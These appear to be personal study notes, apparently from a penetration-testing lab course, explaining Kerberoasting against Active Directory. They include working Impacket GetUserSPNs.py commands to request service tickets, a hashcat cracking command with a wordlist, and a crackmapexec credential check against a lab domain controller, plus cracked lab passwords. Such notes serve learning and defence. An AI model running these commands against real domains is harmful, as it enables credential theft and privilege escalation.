# Kerberoasting Overview
---
- Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments
- This attack **targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts.**
- **SPNs are unique identifiers** that Kerberos uses to **map a service instance to a service account** in **==whose==** **==context the service is running.==**
- Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`.
- **Any domain user can request a Kerberos ticket for any service accoun**t in the same domain.
- Finding **SPNs associated with highly privileged accounts in a Windows environment is very common.**
- The **ticket (TGS-REP)** is **==encrypted with the service account’s NTLM hash==**, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.
- ![[Pasted image 20250809060245.png]]

# Tools
---
Several tools can be utilized to perform the attack:
- **Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)** from a non-domain joined Linux host.
- A combination of the built-in **setspn.exe Windows binary, PowerShell, and Mimikatz.**
- From Windows, utilizing tools such as **PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.**

# Performing the Attack
---
- Kerberoasting attacks are **easily done now using automated tools and scripts**. 
- We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. 

## Kerberoasting with GetUserSPNs.py
- Listing SPN Accounts with GetUserSPNs.py:
	- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
	- ![[Pasted image 20250809060525.png]]
- Requesting all TGS Tickets:
	- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
	- ![[Pasted image 20250809060559.png]]
	- We can also be more targeted and **==request just the TGS ticket for a specific account.==** 
	- Let's try requesting one for just the `sqldev` account:
		- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`
		- ![[Pasted image 20250809060628.png]]

	- To facilitate **==offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file==** that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.

	- Saving the TGS Ticket to an Output File:
		- `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`

## Cracking the Ticket Offline with Hashcat:
- `hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt `
## Testing Authentication against a Domain Controller:
- `sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!`
- `Klmcargo2`